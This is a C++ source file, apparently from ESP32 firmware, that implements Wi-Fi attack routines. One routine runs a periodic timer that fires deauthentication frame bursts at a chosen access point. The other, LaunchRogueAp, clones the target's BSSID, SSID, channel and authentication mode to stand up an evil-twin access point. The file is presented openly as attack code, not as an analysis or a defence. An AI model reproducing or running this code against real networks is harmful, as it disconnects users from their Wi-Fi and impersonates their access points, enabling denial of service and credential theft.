#include "StrikeMethod.hpp"
#include <cstring>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "RadioInterface.hpp"
#include "FrameInjector.hpp"

static const char* Tag = "StrikeMethod";
static esp_timer_handle_t BroadcastTimer = nullptr;

static void OnBroadcastTick(void* Arg) {
    FrameInjector::SendDeauthBurst(static_cast<const wifi_ap_record_t*>(Arg));
}

namespace StrikeMethod {
    void LaunchBroadcast(const wifi_ap_record_t* Target, unsigned PeriodSec) {
        const esp_timer_create_args_t Args = {
            .callback = &OnBroadcastTick,
            .arg      = const_cast<wifi_ap_record_t*>(Target),
            .name     = "BroadcastTimer"
        };
        ESP_ERROR_CHECK(esp_timer_create(&Args, &BroadcastTimer));
        ESP_ERROR_CHECK(esp_timer_start_periodic(BroadcastTimer,
            static_cast<uint64_t>(PeriodSec) * 1'000'000ULL));
    }

    void HaltBroadcast() {
        ESP_ERROR_CHECK(esp_timer_stop(BroadcastTimer));
        esp_timer_delete(BroadcastTimer);
        BroadcastTimer = nullptr;
    }

    void LaunchRogueAp(const wifi_ap_record_t* Target) {
        RadioInterface::SetApMac(Target->bssid);
        wifi_config_t Cfg = {};
        Cfg.ap.ssid_len       = static_cast<uint8_t>(strlen(reinterpret_cast<const char*>(Target->ssid)));
        Cfg.ap.channel        = Target->primary;
        Cfg.ap.authmode       = Target->authmode;
        Cfg.ap.max_connection = 1;
        memcpy(Cfg.ap.ssid,     Target->ssid, 32);
        memcpy(Cfg.ap.password, "Placeholder1!", 14);
        RadioInterface::StartAccessPoint(&Cfg);
    }
}
